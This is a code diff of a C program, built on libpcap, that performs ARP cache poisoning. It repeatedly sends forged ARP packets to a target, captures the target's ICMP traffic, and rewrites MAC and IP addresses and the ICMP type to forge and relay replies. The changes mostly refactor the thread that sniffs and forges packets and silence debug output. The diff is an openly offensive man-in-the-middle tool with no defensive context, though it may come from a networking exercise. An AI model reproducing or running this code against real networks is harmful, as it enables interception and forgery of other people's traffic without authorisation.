@@ -133,17 +133,17 @@ void arp_infect(pcap_t *handle, u_char *my_mac, u_char *sender_mac, struct in_ad
 	memcpy(packet,&ether,sizeof(ether));
 	memcpy(packet+sizeof(ether),&arp_h,sizeof(arp_h));
 	packet_len = sizeof(ether) + sizeof(arp_h);
-
+/*
 	printf("\n[+] packet to send(packet length : %d \n",packet_len);
 	packet_dump(packet,packet_len);
 	printf("end\n\n");
-
+*/
 	while(1){
 		if(pcap_sendpacket(handle,packet,packet_len) == 0)
 			break;
 	}
 
-	printf("\n[+] arp infection completed!\n\n");
+	//printf("\n[+] arp infection completed!\n\n");
 }
 
 void *infection(void *data){
@@ -161,23 +161,31 @@ void *infection(void *data){
 	while(1){
 		//printf("while loop\n");
 		arp_infect(handle, sender_mac, target_mac, senderIP, targetIP);
-		printf("\t\t[*] arp spoofing...\n");
+		//printf("[*] arp spoofing...\n");
 		sleep(2);
 	}
 }
 
 void *sniff_packet(void *data){
-	u_char *sender_mac = (u_char *)data;
+	argu_group *argu = (argu_group *)data;
+	//pcap_t *handle = argu->handle;
+	u_char *sender_mac = argu->sender_mac;
+	u_char *target_mac = argu->target_mac;
+	struct in_addr *senderIP = argu->senderIP;
+	struct in_addr *targetIP = argu->targetIP;
+
 	pcap_t *handle;
 	char errbuf[PCAP_ERRBUF_SIZE];
 	u_char *packet, *send_packet;
 	int packet_len;
 	struct pcap_pkthdr *header;
 	int ret;
-	struct etherhdr send_ether, *recv_ether;
-	struct iphdr send_iphdr, *recv_iphdr;
+	struct etherhdr *send_ether, *recv_ether;
+	struct iphdr *send_iphdr, *recv_iphdr;
+	struct icmphdr *send_icmp;
 	struct in_addr *ping_addr;
 	int mod;
+	u_char *temp;
 
 	handle = pcap_open_live("en0", BUFSIZ, 1, 1000, errbuf);
 	if(handle == NULL){
@@ -201,21 +209,53 @@ void *sniff_packet(void *data){
 			break;
 		}
 		else{
+			//printf("[+] packet sniffing success!\n");
 			recv_ether = (struct etherhdr *)packet;
-			if(strcmp(recv_ether->src,sender_mac)) continue;
-			if(ntohl(recv_ether->ether_type) != ETHERTYPE_IP) continue;
+			
+			if(strcmp(recv_ether->src,target_mac)) continue;
+
+			
+			if(ntohs(recv_ether->ether_type) != ETHERTYPE_IP) {
+				printf("recv_ether->ether_type : %x\n",ntohs(recv_ether->ether_type));
+				continue;
+			}
 			recv_iphdr = (struct iphdr *)(packet+sizeof(struct etherhdr));
-			if(recv_iphdr->ip_p != 1) continue;
+			if(recv_iphdr->ip_p != 1) {
+				printf("%d\n",recv_iphdr->ip_p);
+				continue;
+			}
 			else{
 				//ping_addr = (struct in_addr *)malloc(sizeof(struct in_addr));
 				//ping_addr = recv_iphdr->ip_dst;
+				//printf("ip protocol is ICMP\n");
 				if(packet[34] == 0) continue;
 				else{
-					send_packet = (u_char *)malloc(98);
-					memcpy(send_packet,packet,98);
+					send_packet = (u_char *)malloc(74);
+					memcpy(send_packet,packet,74);
+					send_ether = (struct etherhdr *)(send_packet);
+					send_iphdr = (struct iphdr *)(send_packet+sizeof(struct etherhdr));
+					memcpy(send_ether->dst,target_mac,6);
+					memcpy(send_ether->src,sender_mac,6);
+					memcpy(&(send_iphdr->ip_src.s_addr),send_packet+30,4);
+					memcpy(&(send_iphdr->ip_dst.s_addr),senderIP,4);
+					//memcpy(send_iphdr->ip_dst.s_addr,senderIP,4);
+					send_icmp = (struct icmphdr *)(send_packet+sizeof(struct etherhdr)+sizeof(struct iphdr));
+					printf("icmp type : %d\n",send_icmp->type);
+					memcpy(&(send_icmp->type),"\x00",sizeof(send_icmp->type));
 					printf("\n[*] send packet dump\n");
-					packet_dump(send_packet,98);
+					packet_dump(send_packet,74);
 					printf("end\n");
+					printf("destination mac : "); print_mac(send_ether->dst);
+					printf("source mac : "); print_mac(send_ether->src);
+					printf("surce IP : %x\n",htonl(send_iphdr->ip_src.s_addr));
+					printf("destination IP : %x\n",htonl(send_iphdr->ip_dst.s_addr));
+					printf("ICMP type : %x\n",send_icmp->type);
+
+					while(1){
+						if(pcap_sendpacket(handle,send_packet,74) == 0)
+							break;
+					}
+
 					free(send_packet);
 				}
 			}
@@ -300,7 +340,7 @@ int main(int argc, char* argv[])
  	else
  		printf("\n[-] pthread create success!\n");
 
- 	thr_id = pthread_create(&p_thread[1],NULL,sniff_packet,(void *)sender_mac);
+ 	thr_id = pthread_create(&p_thread[1],NULL,sniff_packet,(void *)argu);
  	if(thr_id < 0){
  		printf("\n[-] pthread create error!\n");
  		exit(1);
